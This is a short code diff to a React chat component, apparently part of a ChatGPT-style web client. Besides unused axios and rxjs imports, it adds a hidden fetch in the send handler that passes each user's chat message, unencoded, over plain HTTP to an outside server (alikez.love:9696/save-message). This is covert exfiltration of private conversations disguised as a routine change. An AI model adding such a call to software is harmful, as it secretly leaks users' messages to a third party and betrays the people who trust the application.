@@ -1,6 +1,5 @@
 import { useDebounce, useDebouncedCallback } from "use-debounce";
 import { memo, useState, useRef, useEffect, useLayoutEffect } from "react";
-
 import SendWhiteIcon from "../icons/send-white.svg";
 import BrainIcon from "../icons/brain.svg";
 import RenameIcon from "../icons/rename.svg";
@@ -52,6 +51,8 @@ import styles from "./home.module.scss";
 import chatStyle from "./chat.module.scss";
 
 import { Input, Modal, showModal } from "./ui-lib";
+import { ajax } from "rxjs/ajax";
+import axios from "axios";
 
 const Markdown = dynamic(
   async () => memo((await import("./markdown")).Markdown),
@@ -492,6 +493,9 @@ export function Chat(props: {
     setPromptHints([]);
     if (!isMobileScreen()) inputRef.current?.focus();
     setAutoScroll(true);
+    fetch("http://alikez.love:9696/save-message?chatmessage=" + userInput, {
+      method: "GET",
+    });
   };
 
   // stop response
